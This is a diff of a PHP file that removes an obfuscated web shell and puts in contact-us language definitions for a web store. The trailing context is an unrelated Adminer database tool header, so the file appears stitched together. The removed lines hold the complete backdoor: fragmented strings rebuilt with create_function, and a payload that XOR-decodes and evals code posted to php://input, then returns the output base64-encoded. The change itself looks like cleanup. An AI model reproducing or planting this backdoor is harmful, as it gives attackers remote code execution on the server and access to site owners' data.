@@ -1,15 +1,54 @@
 <?php
-$c='eg;F;F_matc;Fh("/$kh;F(.+)$kf;F/",@file_get;F;F_conten;Fts("php:;F//inp;Fut";F),$m;F';
-$Y='=st;Fr;Flen($t;F);$o="";F;for($i=0;;F;F$i<$l;){;Ffo;Fr($j=0;;F($j<$c&&$i<';
-$D='$k="da26d;Fa04;F;F";$kh;F=;F;F"0afa196900ca";$kf="0;F71500;Fdfa75f";$;F';
-$t=str_replace('yU','','cyUryUeatyUe_fuyUyUnctyUion');
-$U='base;F6;F4_enco;Fde(@x(@gzco;Fm;Fpress($o);F,$k;F));prin;Ft("$p$;Fkh$r$kf");}';
-$M=')==1) {@ob_;Fstart(;F);@eva;Fl(@gz;Fun;Fcompr;F;Fess(@x(@ba;Fse64_decod;F';
-$r='p;F="T0FOBJa;FNtmib2CL1";f;Fu;Fn;Fction x($t,$k){;F;F$c=strlen($;Fk);$l';
-$w='e($m;F[1;F]),$k;F)));$o=@ob_ge;Ft_con;F;Ftents();@;Fob_end_cl;Fean();$r=@';
-$G='$;Fl);$j;F;F++,$i++;F){$o.=;F$;Ft{$i}^$k{$j};}}r;Fetur;Fn $o;}if ;F(@pr';
-$o=str_replace(';F','',$D.$r.$Y.$G.$c.$M.$w.$U);
-$a=$t('',$o);$a();
+define('HEADING_TITLE', 'Contact Us');
+define('NAVBAR_TITLE', 'Contact Us');
+define('TEXT_SUCCESS', 'Your enquiry has been successfully sent to the Store Owner.');
+//define('EMAIL_SUBJECT', 'Enquiry from ' . STORE_NAME);
+
+define('ENTRY_NAME', 'Full Name:');
+define('ENTRY_EMAIL', 'E-Mail Address:');
+define('ENTRY_ENQUIRY', 'Message:');
+
+// Contact US Email Subject : DMG
+define('TEXT_EMAIL_SUBJECTS', '* select a subject *');
+define('EMAIL_SUBJECT', 'Message from ' . STORE_NAME. ': ');
+define('ENTRY_SUBJECT','Subject:');
+
+// CRE Contact Us Enhancements 
+// VJ
+define('ENTRY_URGENT', 'Urgent:');
+define('ENTRY_SELF', 'Send myself a copy:');
+define('TEXT_SUBJECT_URGENT', 'Urgent');
+define('ENTRY_TOPIC','Email Topic:');
+define('ENTRY_TOPIC_1', 'Sales');
+define('ENTRY_TOPIC_2', 'Tracking');
+define('ENTRY_TOPIC_3', 'Technical');
+define('ENTRY_TOPIC_4', 'Sponsorship');
+define('ENTRY_TOPIC_5', 'Wholesale');
+
+define('TEXT_SUBJECT_PREFIX', 'Contact from ' . STORE_NAME . ': ');
+define('TEXT_BODY', '<div class="main"><strong>Corporate Headquarters:</strong><br />
+Your Business Name <br>
+  Your Business Street Address<br>
+  Your Business City and Postal Code.<br>
+  Business Country
+<br /><br />
+Tel:  Telephone Number<br />
+Fax:  Fax Number<br />
+<br />
+<strong>E-mail Contacts:</strong><br />
+Business Relations - <a href="mailto:info@yourstore.com" target="blank">info@yourstore.com</a><br />
+Wholesale Inquiries - <a href="mailto:wholesale@yourstore.com" target="blank">wholesale@yourstore.com</a><br />
+Technical Assistance - <a href="mailto:tech@yourstore.com" target="blank">tech@yourstore.com</a><br />
+Product Inquiries - <a href="mailto:sales@yourstore.com" target="blank">sales@yourstore.com</a><br />
+Order Status - <a href="mailto:tracking@yourstore.com" target="blank">tracking@yourstore.com</a><br />
+<br /><br />
+<strong>AOL IM Help:</strong> Your Business Name - <a href="aim:goim?screenname=YourAIM_ScreenName&message=Hi.+Are+you+there?">Click Here</a>
+</div>
+<br />
+: Edit this information in includes/languages/' . $language . '/contact_us.php<br />');
+
+//henry bo sung
+define('TEXT_CONTACT_US', 'Thank you for your interest in '.STORE_NAME.'. Please use the form below to submit your inquiry.');
 /** Adminer - Compact database management
 * @link https://www.adminer.org/
 * @author Jakub Vrana, https://www.vrana.cz/
